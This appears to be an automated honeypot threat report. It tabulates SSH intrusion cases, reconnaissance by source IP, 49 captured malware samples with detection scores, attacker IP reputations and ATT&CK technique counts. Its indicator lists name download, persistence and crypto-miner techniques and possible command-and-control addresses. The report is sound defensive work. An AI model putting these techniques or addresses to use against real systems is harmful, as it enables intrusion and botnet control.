| IR-982f2f33e868 | HIGH | `103.195.236[.]35` | 2026-11-25 11:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-48a7997c3fac | HIGH | `80.94.92[.]179` | 2026-11-25 11:42 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-e47bf15cf048 | HIGH | `80.94.92[.]179` | 2026-11-25 11:45 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-82700d34870b | HIGH | `213.154.77[.]61` | 2026-11-25 11:47 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3e10b01f33f9 | HIGH | `213.154.77[.]61` | 2026-11-25 11:47 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1f5c9144e96d | HIGH | `80.94.92[.]179` | 2026-11-25 11:47 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-08e537d6695c | HIGH | `80.94.92[.]179` | 2026-11-25 11:50 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-1e9998e429a0 | HIGH | `70.120.203[.]193` | 2026-11-25 11:50 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-68ac38ebdca8 | HIGH | `70.120.203[.]193` | 2026-11-25 11:50 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0350c5a108d0 | HIGH | `69.6.207[.]8` | 2026-11-25 11:51 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-91c92922124f | HIGH | `69.6.207[.]8` | 2026-11-25 11:51 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4422651410f9 | HIGH | `57.134.138[.]210` | 2026-11-25 11:51 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-fc0ae18903e6 | HIGH | `57.134.138[.]210` | 2026-11-25 11:51 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c7e988408608 | HIGH | `80.94.92[.]179` | 2026-11-25 11:52 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-027081069e00 | HIGH | `27.123.251[.]150` | 2026-11-25 11:53 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-04998885bcd3 | HIGH | `27.123.251[.]150` | 2026-11-25 11:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0b7f5f6e0e29 | HIGH | `107.150.105[.]153` | 2026-11-25 11:53 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-095d479ced45 | HIGH | `107.150.105[.]153` | 2026-11-25 11:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3bcf004ff487 | HIGH | `80.94.92[.]179` | 2026-11-25 11:54 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-177099781142 | HIGH | `80.94.92[.]179` | 2026-11-25 11:57 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-10204ecc2062 | HIGH | `80.94.92[.]179` | 2026-11-25 11:59 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-e575fa5f9806 | HIGH | `80.94.92[.]179` | 2026-11-25 12:02 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-fc3028bd4c00 | HIGH | `80.94.92[.]179` | 2026-11-25 12:04 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-220d409e5426 | HIGH | `80.94.92[.]179` | 2026-11-25 12:06 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-7a48672403ab | HIGH | `80.94.92[.]179` | 2026-11-25 12:09 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-347e28ed06bc | HIGH | `80.94.92[.]179` | 2026-11-25 12:11 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-8d61a576ec47 | HIGH | `80.94.92[.]179` | 2026-11-25 12:14 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-1b25aacfb7f6 | HIGH | `80.94.92[.]179` | 2026-11-25 12:16 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-e3ae7fe2d1c2 | HIGH | `80.94.92[.]179` | 2026-11-25 12:18 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-4d108dcc1e0c | HIGH | `65.181.127[.]40` | 2026-11-25 12:20 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-4e31227db33d | HIGH | `65.181.127[.]40` | 2026-11-25 12:20 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f34157772813 | HIGH | `80.94.92[.]179` | 2026-11-25 12:21 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-bae33da18f29 | HIGH | `80.94.92[.]179` | 2026-11-25 12:23 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-f3af6947680f | HIGH | `80.94.92[.]179` | 2026-11-25 12:26 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-063a15961dfc | HIGH | `80.94.92[.]179` | 2026-11-25 12:28 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-56033d94e043 | HIGH | `1.214.214[.]114` | 2026-11-25 12:29 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d197a33011de | HIGH | `1.214.214[.]114` | 2026-11-25 12:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-56e2a7a985b5 | HIGH | `179.179.198[.]61` | 2026-11-25 12:31 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
_… 239 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `137.184.5[.]188` | **3** | 2026-11-25 15:16 | 2026-11-25 18:17 | 3m | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]132` | **3** | 2026-11-25 11:51 | 2026-11-25 14:18 | 0m | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | **2** | 2026-11-25 11:09 | 2026-11-25 12:54 | 1m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]227` | **2** | 2026-11-25 17:55 | 2026-11-25 18:55 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]78` | **2** | 2026-11-25 09:08 | 2026-11-25 10:07 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `195.178.110[.]78` | **2** | 2026-11-25 13:50 | 2026-11-25 14:04 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `49.228.36[.]151` | **2** | 2026-11-25 17:39 | 2026-11-25 18:05 | 4m | 0 | `T1592` | 🟢 LOW |
| `61.85.22[.]19` | **2** | 2026-11-25 09:45 | 2026-11-25 10:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]11` | 1 | 2026-11-25 12:21 | 2026-11-25 12:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.216.126[.]99` | 1 | 2026-11-25 14:24 | 2026-11-25 14:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `104.234.41[.]32` | 1 | 2026-11-25 17:21 | 2026-11-25 17:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `111.33.71[.]238` | 1 | 2026-11-25 12:59 | 2026-11-25 12:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `112.103.74[.]165` | 1 | 2026-11-25 11:21 | 2026-11-25 11:21 | 14s | 0 | `T1592` | 🟢 LOW |
| `117.50.70[.]125` | 1 | 2026-11-25 08:06 | 2026-11-25 08:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `122.116.101[.]214` | 1 | 2026-11-25 11:59 | 2026-11-25 11:59 | 30s | 0 | `T1592` | 🟢 LOW |
| `125.253.57[.]16` | 1 | 2026-11-25 17:46 | 2026-11-25 17:46 | 12s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-11-25 08:23 | 2026-11-25 08:23 | 40s | 0 | `T1592` | 🟢 LOW |
| `139.59.145[.]98` | 1 | 2026-11-25 15:01 | 2026-11-25 15:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.71[.]220` | 1 | 2026-11-25 12:37 | 2026-11-25 12:37 | 7s | 0 | `T1592` | 🟢 LOW |
| `14.44.31[.]59` | 1 | 2026-11-25 11:17 | 2026-11-25 11:17 | 15s | 0 | `T1592` | 🟢 LOW |
| `14.57.186[.]60` | 1 | 2026-11-25 10:54 | 2026-11-25 10:55 | 23s | 0 | `T1592` | 🟢 LOW |
| `166.62.41[.]96` | 1 | 2026-11-25 13:12 | 2026-11-25 13:13 | 33s | 0 | `T1592` | 🟢 LOW |
| `166.62.41[.]96` | 1 | 2026-11-25 18:07 | 2026-11-25 18:07 | 32s | 0 | `T1592` | 🟢 LOW |
| `170.231.236[.]98` | 1 | 2026-11-25 17:54 | 2026-11-25 17:54 | 6s | 0 | `T1592` | 🟢 LOW |
| `170.82.53[.]235` | 1 | 2026-11-25 13:48 | 2026-11-25 13:48 | 33s | 0 | `T1592` | 🟢 LOW |
| `172.248.177[.]222` | 1 | 2026-11-25 18:37 | 2026-11-25 18:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | 1 | 2026-11-25 08:57 | 2026-11-25 08:58 | 9s | 0 | `T1592` | 🟢 LOW |
| `180.76.57[.]66` | 1 | 2026-11-25 12:51 | 2026-11-25 12:52 | 15s | 0 | `T1592` | 🟢 LOW |
| `183.109.238[.]204` | 1 | 2026-11-25 12:51 | 2026-11-25 12:51 | 21s | 0 | `T1592` | 🟢 LOW |
| `185.79.6[.]215` | 1 | 2026-11-25 15:56 | 2026-11-25 15:56 | 13s | 0 | `T1592` | 🟢 LOW |
| `194.187.176[.]123` | 1 | 2026-11-25 17:27 | 2026-11-25 17:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]78` | 1 | 2026-11-25 16:36 | 2026-11-25 16:36 | 1s | 1 | `T1110.001` | 🟢 LOW |
| `198.179.70[.]19` | 1 | 2026-11-25 17:09 | 2026-11-25 17:09 | 10s | 0 | `T1592` | 🟢 LOW |
| `20.40.220[.]48` | 1 | 2026-11-25 17:16 | 2026-11-25 17:17 | 10s | 0 | `T1592` | 🟢 LOW |
| `20.83.154[.]121` | 1 | 2026-11-25 16:30 | 2026-11-25 16:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.37.103[.]36` | 1 | 2026-11-25 15:55 | 2026-11-25 15:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `211.104.215[.]184` | 1 | 2026-11-25 18:20 | 2026-11-25 18:20 | 13s | 0 | `T1592` | 🟢 LOW |
| `211.185.81[.]244` | 1 | 2026-11-25 08:03 | 2026-11-25 08:04 | 30s | 0 | `T1592` | 🟢 LOW |
| `216.218.206[.]69` | 1 | 2026-11-25 09:42 | 2026-11-25 09:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `217.113.11[.]99` | 1 | 2026-11-25 14:31 | 2026-11-25 14:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `222.112.46[.]78` | 1 | 2026-11-25 11:10 | 2026-11-25 11:10 | 30s | 0 | `T1592` | 🟢 LOW |
| `23.132.164[.]185` | 1 | 2026-11-25 11:31 | 2026-11-25 11:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `3.133.84[.]157` | 1 | 2026-11-25 12:46 | 2026-11-25 12:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `41.82.136[.]40` | 1 | 2026-11-25 14:37 | 2026-11-25 14:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `43.100.90[.]143` | 1 | 2026-11-25 17:10 | 2026-11-25 17:10 | 3s | 0 | `T1592` | 🟢 LOW |
| `43.103.45[.]150` | 1 | 2026-11-25 13:54 | 2026-11-25 13:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.61.172[.]209` | 1 | 2026-11-25 13:50 | 2026-11-25 13:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-11-25 18:26 | 2026-11-25 18:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.109.79[.]112` | 1 | 2026-11-25 16:15 | 2026-11-25 16:15 | 20s | 0 | `T1592` | 🟢 LOW |
| `47.236.165[.]237` | 1 | 2026-11-25 14:25 | 2026-11-25 14:26 | 32s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]148` | 1 | 2026-11-25 16:06 | 2026-11-25 16:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]219` | 1 | 2026-11-25 07:56 | 2026-11-25 07:56 | 1s | 0 | `T1592` | 🟢 LOW |
| `64.226.125[.]197` | 1 | 2026-11-25 15:01 | 2026-11-25 15:01 | 20s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-11-25 17:09 | 2026-11-25 17:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]104` | 1 | 2026-11-25 16:31 | 2026-11-25 16:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]209` | 1 | 2026-11-25 14:16 | 2026-11-25 14:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]237` | 1 | 2026-11-25 15:31 | 2026-11-25 15:31 | 1s | 0 | `T1592` | 🟢 LOW |
| `67.167.123[.]207` | 1 | 2026-11-25 13:36 | 2026-11-25 13:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-25 15:48 | 2026-11-25 15:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]132` | 1 | 2026-11-25 08:37 | 2026-11-25 08:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]14` | 1 | 2026-11-25 17:05 | 2026-11-25 17:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-25 09:21 | 2026-11-25 09:21 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-25 13:43 | 2026-11-25 13:44 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-25 18:04 | 2026-11-25 18:04 | 6s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]179` | 1 | 2026-11-25 10:13 | 2026-11-25 10:14 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `85.217.149[.]12` | 1 | 2026-11-25 08:39 | 2026-11-25 08:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]28` | 1 | 2026-11-25 11:46 | 2026-11-25 11:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]4` | 1 | 2026-11-25 11:42 | 2026-11-25 11:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]65` | 1 | 2026-11-25 13:43 | 2026-11-25 13:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]71` | 1 | 2026-11-25 13:20 | 2026-11-25 13:20 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `94.199.67[.]132` | 1 | 2026-11-25 17:47 | 2026-11-25 17:48 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0de787cffbec4dcc42e0ecd9491795c7dfe8fe4a955cb67a87544d5c36070982` | ELF Binary (Linux executable) (x86-64 64-bit) | `0de787cffbec4dcc...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `187b67e5e2116293144f4009b1f224ed09eea924dd4ade00741a66792a63b45a` | ELF Binary (Linux executable) (x86-64 64-bit) | `187b67e5e2116293...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `19e78c00d07f011fcb708ffb12f8dd2fd0f1e57faaf21129b53c7f68ae611e60` | ELF Binary (Linux executable) (x86-64 64-bit) | `19e78c00d07f011f...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `1b3d42e9c13d4d3c0ac6b6aa1584d060b3bc354936be815e12c9a243a470c7f3` | Shell Script | `1b3d42e9c13d4d3c...` | 52/100 | 🟡 MEDIUM | **5/74** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `166.62.41[.]96` | US | GoDaddy.com, LLC | **100** ⚠️ | 50 |
| `78.128.112[.]74` | BG | Lir.bg EOOD | **100** ⚠️ | 50 |
| `119.246.15[.]94` | HK | Hong Kong Broadband Network Ltd | **100** ⚠️ | 50 |
| `18.218.118[.]203` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `43.100.90[.]143` | HK | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 6 |
| `138.226.239[.]234` | NL | Vlad Cojuhari | **100** ⚠️ | 50 |
| `77.90.185[.]29` | LT | Limited Network LTD | **100** ⚠️ | 16 |
| `61.171.36[.]43` | CN | CHINANET Shanghai province network | **100** ⚠️ | 10 |
| `85.217.149[.]28` | CA | Modat B.V. | **100** ⚠️ | 0 |
| `180.76.57[.]66` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 24 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 380 |
